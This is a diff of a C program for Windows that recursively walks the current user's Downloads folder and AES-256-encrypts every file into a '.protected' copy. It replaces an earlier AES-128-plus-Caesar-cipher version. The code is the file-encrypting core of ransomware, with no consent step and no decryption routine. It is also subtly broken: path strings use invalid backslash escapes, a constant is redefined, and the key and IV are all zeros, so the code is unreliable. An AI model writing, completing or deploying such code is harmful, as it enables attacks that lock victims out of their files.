@@ -1,161 +1,147 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <openssl/evp.h>
-#include <openssl/rand.h>
 #include <dirent.h>
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+#include <sys/stat.h>
 #include <windows.h>
 
-#define AES_KEY_SIZE 16  // 128-bit key size for AES
-#define BUFFER_SIZE 1024
-#define CAESAR_SHIFT 3  // Caesar Cipher shift
+#define AES_KEY_LENGTH 256
+#define AES_BLOCK_SIZE 16
 
-// Function to apply AES encryption using OpenSSL's EVP API
-void aes_encrypt(FILE *infile, FILE *outfile, unsigned char *key, unsigned char *iv) {
-    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-    if (!ctx) {
-        perror("EVP_CIPHER_CTX_new failed");
-        return;
+int aes_encrypt(const unsigned char *plaintext, int plaintext_len, const unsigned char *key,
+                const unsigned char *iv, unsigned char *ciphertext) {
+    EVP_CIPHER_CTX *ctx;
+    int len;
+    int ciphertext_len;
+
+    if (!(ctx = EVP_CIPHER_CTX_new())) {
+        perror("EVP_CIPHER_CTX_new");
+        return -1;
     }
 
-    // Initialize the AES encryption context
-    if (EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv) != 1) {
-        perror("EVP_EncryptInit_ex failed");
+    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv) != 1) {
+        perror("EVP_EncryptInit_ex");
         EVP_CIPHER_CTX_free(ctx);
-        return;
+        return -1;
     }
 
-    unsigned char inbuf[BUFFER_SIZE], outbuf[BUFFER_SIZE + EVP_MAX_BLOCK_LENGTH];
-    int inlen, outlen;
-
-    // Encrypt the file in chunks
-    while ((inlen = fread(inbuf, 1, BUFFER_SIZE, infile)) > 0) {
-        if (EVP_EncryptUpdate(ctx, outbuf, &outlen, inbuf, inlen) != 1) {
-            perror("EVP_EncryptUpdate failed");
-            EVP_CIPHER_CTX_free(ctx);
-            return;
-        }
-        fwrite(outbuf, 1, outlen, outfile);
-    }
-
-    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
-        perror("EVP_EncryptFinal_ex failed");
+    if (EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len) != 1) {
+        perror("EVP_EncryptUpdate");
         EVP_CIPHER_CTX_free(ctx);
-        return;
+        return -1;
     }
+    ciphertext_len = len;
 
-    fwrite(outbuf, 1, outlen, outfile);
+    if (EVP_EncryptFinal_ex(ctx, ciphertext + len, &len) != 1) {
+        perror("EVP_EncryptFinal_ex");
+        EVP_CIPHER_CTX_free(ctx);
+        return -1;
+    }
+    ciphertext_len += len;
+
     EVP_CIPHER_CTX_free(ctx);
+    return ciphertext_len;
 }
 
-// Caesar Cipher for additional encryption
-void caesar_cipher(FILE *file) {
-    unsigned char buffer[BUFFER_SIZE];
-    size_t bytesRead;
-
-    // Read and apply Caesar Cipher to the file in chunks
-    while ((bytesRead = fread(buffer, 1, BUFFER_SIZE, file)) > 0) {
-        for (size_t i = 0; i < bytesRead; i++) {
-            // Encrypt characters (apply Caesar Cipher)
-            if ((buffer[i] >= 'A' && buffer[i] <= 'Z') || (buffer[i] >= 'a' && buffer[i] <= 'z')) {
-                if (buffer[i] >= 'A' && buffer[i] <= 'Z') {
-                    buffer[i] = ((buffer[i] - 'A' + CAESAR_SHIFT) % 26) + 'A';
-                } else if (buffer[i] >= 'a' && buffer[i] <= 'z') {
-                    buffer[i] = ((buffer[i] - 'a' + CAESAR_SHIFT) % 26) + 'a';
-                }
-            }
-        }
-        fwrite(buffer, 1, bytesRead, file);  // Write the modified buffer back
-    }
-}
-
-// Function to get the Downloads folder path from USERPROFILE
-char* get_downloads_folder_path() {
-    char *userProfile = getenv("USERPROFILE");
-    if (userProfile == NULL) {
-        fprintf(stderr, "USERPROFILE environment variable not found.\n");
-        return NULL;
-    }
-
-    // Allocate memory for the full path
-    char *downloadsPath = (char*)malloc(strlen(userProfile) + strlen("\\Downloads") + 1);
-    if (downloadsPath == NULL) {
-        perror("Memory allocation failed");
-        return NULL;
-    }
-
-    // Construct the path to the Downloads folder
-    sprintf(downloadsPath, "%s\\Downloads", userProfile);
-    return downloadsPath;
-}
-
-// Function to encrypt a single file using AES and Caesar Cipher
-void encrypt_file(const char *filepath, unsigned char *key, unsigned char *iv) {
-    FILE *file = fopen(filepath, "r+b");
-    if (file == NULL) {
-        perror("Error opening file");
+void encrypt_file(const char *filepath, const unsigned char *key, const unsigned char *iv) {
+    FILE *file = fopen(filepath, "rb");
+    if (!file) {
+        perror("fopen");
         return;
     }
 
-    // Create an encrypted file with .protected extension
-    char encryptedFilePath[1024];
-    sprintf(encryptedFilePath, "%s.protected", filepath);  // Save with .protected extension
-    FILE *encryptedFile = fopen(encryptedFilePath, "w+b");
-    if (encryptedFile == NULL) {
-        perror("Error opening encrypted file");
+    fseek(file, 0, SEEK_END);
+    long filesize = ftell(file);
+    rewind(file);
+
+    unsigned char *plaintext = malloc(filesize);
+    if (!plaintext) {
+        perror("malloc");
         fclose(file);
         return;
     }
 
-    // First apply AES encryption
-    aes_encrypt(file, encryptedFile, key, iv);
+    fread(plaintext, 1, filesize, file);
     fclose(file);
-    
-    // Apply Caesar Cipher to the encrypted file
-    fseek(encryptedFile, 0, SEEK_SET);  // Go to the beginning of the encrypted file
-    caesar_cipher(encryptedFile);
-    
-    fclose(encryptedFile);
-    printf("Encrypted file saved as: %s\n", encryptedFilePath);
+
+    unsigned char *ciphertext = malloc(filesize + AES_BLOCK_SIZE);
+    if (!ciphertext) {
+        perror("malloc");
+        free(plaintext);
+        return;
+    }
+
+    int ciphertext_len = aes_encrypt(plaintext, filesize, key, iv, ciphertext);
+
+    free(plaintext);
+
+    if (ciphertext_len > 0) {
+        char protected_filepath[MAX_PATH];
+        snprintf(protected_filepath, sizeof(protected_filepath), "%s.protected", filepath);
+
+        file = fopen(protected_filepath, "wb");
+        if (!file) {
+            perror("fopen");
+            free(ciphertext);
+            return;
+        }
+        fwrite(ciphertext, 1, ciphertext_len, file);
+        fclose(file);
+        free(ciphertext);
+
+        printf("Encrypted: %s\n", protected_filepath);
+    } else {
+        free(ciphertext);
+        printf("Failed to encrypt: %s\n", filepath);
+    }
 }
 
-// Function to scan the Downloads folder and encrypt all files
-void encrypt_files_in_downloads(unsigned char *key, unsigned char *iv) {
-    char *downloadsFolderPath = get_downloads_folder_path();
-    if (downloadsFolderPath == NULL) {
-        return;
-    }
-
-    DIR *dir = opendir(downloadsFolderPath);
-    if (dir == NULL) {
-        perror("Failed to open directory");
-        free(downloadsFolderPath);
-        return;
-    }
-
+void process_directory(const char *directory, const unsigned char *key, const unsigned char *iv) {
     struct dirent *entry;
-    while ((entry = readdir(dir)) != NULL) {
-        // Skip directories (we only want files)
-        if (entry->d_type == DT_DIR) {
+    DIR *dp = opendir(directory);
+
+    if (!dp) {
+        perror("opendir");
+        return;
+    }
+
+    char filepath[MAX_PATH];
+    while ((entry = readdir(dp)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
             continue;
         }
 
-        // Construct the full file path
-        char filePath[1024];
-        sprintf(filePath, "%s\\%s", downloadsFolderPath, entry->d_name);
+        snprintf(filepath, sizeof(filepath), "%s\%s", directory, entry->d_name);
 
-        // Encrypt the file
-        encrypt_file(filePath, key, iv);
+        struct stat statbuf;
+        if (stat(filepath, &statbuf) == 0) {
+            if (S_ISREG(statbuf.st_mode)) {
+                encrypt_file(filepath, key, iv);
+            } else if (S_ISDIR(statbuf.st_mode)) {
+                process_directory(filepath, key, iv);
+            }
+        }
     }
 
-    closedir(dir);
-    free(downloadsFolderPath);
+    closedir(dp);
 }
 
 int main() {
-    unsigned char aesKey[AES_KEY_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // 128-bit AES key
-    unsigned char aesIv[AES_BLOCK_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};  // AES IV (initialization vector)
+    char *userprofile = getenv("USERPROFILE");
+    if (!userprofile) {
+        fprintf(stderr, "USERPROFILE environment variable not found\n");
+        return EXIT_FAILURE;
+    }
 
-    encrypt_files_in_downloads(aesKey, aesIv);
-    return 0;
+    char downloads_dir[MAX_PATH];
+    snprintf(downloads_dir, sizeof(downloads_dir), "%s\Downloads", userprofile);
+
+    unsigned char key[AES_KEY_LENGTH / 8] = {0};
+    unsigned char iv[AES_BLOCK_SIZE] = {0};
+
+    process_directory(downloads_dir, key, iv);
+
+    return EXIT_SUCCESS;
 }
